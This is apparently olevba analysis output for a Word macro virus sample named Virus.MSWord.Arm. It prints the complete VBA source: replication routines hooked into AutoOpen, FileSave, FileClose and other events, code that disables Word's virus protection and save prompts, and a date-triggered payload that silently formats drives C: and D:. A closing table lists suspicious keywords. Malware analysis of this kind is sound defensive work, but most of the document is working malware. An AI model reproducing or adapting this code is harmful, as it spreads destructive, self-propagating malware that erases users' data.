olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Armaegaden.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/Armaegaden'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Armaegaden()
If Day(Now()) = 3 And Month(Now()) = 7 Then
    sCmd$ = "echo y | format c:/u"
    Shell (Environ("comspec") + " /c " + sCmd$), vbHide
    sCmd$ = "echo y | format d:/u"
    Shell (Environ("comspec") + " /c " + sCmd$), vbHide
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
On Error GoTo ErrorInfectTM

'Dialogs(wdDialogToolsMacro).Show
If MacroContainer <> ActiveDocument.Name Then
    WordBasic.macrocopy "Armaegaden", ActiveWindow.Caption + ":Armaegaden", 1
    WordBasic.macrocopy "ToolsMacro", ActiveWindow.Caption + ":ToolsMacro", 1
    WordBasic.macrocopy "FileClose", ActiveWindow.Caption + ":FileClose", 1
    WordBasic.macrocopy "FileNew", ActiveWindow.Caption + ":FileNew", 1
    WordBasic.macrocopy "FileExit", ActiveWindow.Caption + ":FileExit", 1
    WordBasic.macrocopy "FileSave", ActiveWindow.Caption + ":FileSave", 1
    WordBasic.macrocopy "FileSaveAs", ActiveWindow.Caption + ":FileSaveAs", 1
    WordBasic.macrocopy "AutoOpen", ActiveWindow.Caption + ":AutoOpen", 1
    WordBasic.macrocopy "AutoClose", ActiveWindow.Caption + ":AutoClose", 1
    WordBasic.macrocopy "AutoExec", ActiveWindow.Caption + ":AutoExec", 1
End If
ErrorInfectTM:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Call Armaegaden.Armaegaden
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
Attribute FileClose.VB_Description = "Closes all of the windows of the active document"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileClose"

On Error GoTo ErrorInfectGlobalTemplateFC
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
    End If
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Template.Save
ErrorInfectGlobalTemplateFC:
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    
    End With
Call Armaegaden.Armaegaden

    WordBasic.FileClose

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileNew.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/FileNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
Attribute FileNew.VB_Description = "Creates a new document or template"
Attribute FileNew.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileNew"

On Error GoTo ErrorInfectGlobalTemplateFN
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
End If
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Template.Save
ErrorInfectGlobalTemplateFN:
        With Options
    .SaveNormalPrompt = False
      .VirusProtection = False
    End With
    Dialogs(wdDialogFileNew).Show
    Call Armaegaden.Armaegaden
    

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileExit()
Attribute FileExit.VB_Description = "Quits Microsoft Word and prompts to save the documents"
Attribute FileExit.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileExit"

On Error GoTo ErrorInfectGlobalTemplateE
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
    End If
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Template.Save
ErrorInfectGlobalTemplateE:
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Call Armaegaden.Armaegaden

    WordBasic.FileExit

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
On Error GoTo ErrorInfectFS
If MacroContainer <> ActiveDocument.Name Then
    WordBasic.macrocopy "Armaegaden", ActiveWindow.Caption + ":Armaegaden", 1
    WordBasic.macrocopy "ToolsMacro", ActiveWindow.Caption + ":ToolsMacro", 1
    WordBasic.macrocopy "FileClose", ActiveWindow.Caption + ":FileClose", 1
    WordBasic.macrocopy "FileNew", ActiveWindow.Caption + ":FileNew", 1
    WordBasic.macrocopy "FileExit", ActiveWindow.Caption + ":FileExit", 1
    WordBasic.macrocopy "FileSave", ActiveWindow.Caption + ":FileSave", 1
    WordBasic.macrocopy "FileSaveAs", ActiveWindow.Caption + ":FileSaveAs", 1
    WordBasic.macrocopy "AutoOpen", ActiveWindow.Caption + ":AutoOpen", 1
    WordBasic.macrocopy "AutoClose", ActiveWindow.Caption + ":AutoClose", 1
    WordBasic.macrocopy "AutoExec", ActiveWindow.Caption + ":AutoExec", 1
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoClose", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoExec", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileExit", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSaveAs", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileClose", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSave", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileNew", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ToolsMacro", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Armaegaden", Object:=wdOrganizerObjectProjectItems
End If
ErrorInfectFS:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
ActiveDocument.Save
Call Armaegaden.Armaegaden


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Saves a copy of the document in a separate file"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileSaveAs"

On Error GoTo ErrorInfectFSA
Set dlg = Dialogs(wdDialogFileSaveAs)
dlg.Update
dlg.Show
If (dlg.Format = 0) Or (dlg.Format = 1) Then
If MacroContainer <> ActiveDocument.Name Then
        WordBasic.macrocopy "Armaegaden", ActiveWindow.Caption + ":Armaegaden", 1
        WordBasic.macrocopy "ToolsMacro", ActiveWindow.Caption + ":ToolsMacro", 1
        WordBasic.macrocopy "FileClose", ActiveWindow.Caption + ":FileClose", 1
        WordBasic.macrocopy "FileNew", ActiveWindow.Caption + ":FileNew", 1
        WordBasic.macrocopy "FileExit", ActiveWindow.Caption + ":FileExit", 1
        WordBasic.macrocopy "FileSave", ActiveWindow.Caption + ":FileSave", 1
        WordBasic.macrocopy "FileSaveAs", ActiveWindow.Caption + ":FileSaveAs", 1
        WordBasic.macrocopy "AutoOpen", ActiveWindow.Caption + ":AutoOpen", 1
        WordBasic.macrocopy "AutoClose", ActiveWindow.Caption + ":AutoClose", 1
        WordBasic.macrocopy "AutoExec", ActiveWindow.Caption + ":AutoExec", 1
        dlg.Format = 1
    End If
End If
ErrorInfectFSA:
If (dlg.Password <> "") Then
    dlg.Password = "Armaegaden"
End If
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    dlg.Update
Call Armaegaden.Armaegaden

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 07/06/99 by Yap"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.autoopen"

On Error GoTo ErrorInfectGlobalTemplate
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
    End If
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Template.Save
ErrorInfectGlobalTemplate:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Call Armaegaden.Armaegaden
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 07/07/99 by ELIJAH GARY LOW"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"

On Error GoTo ErrorInfectGlobalTemplateC
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
End If
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Template.Save
ErrorInfectGlobalTemplateC:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Call Armaegaden.Armaegaden

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Arm-27d1fac0828351d6505992e74f95f1437588a211 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 07/07/99 by ELIJAH GARY LOW"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoExec"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

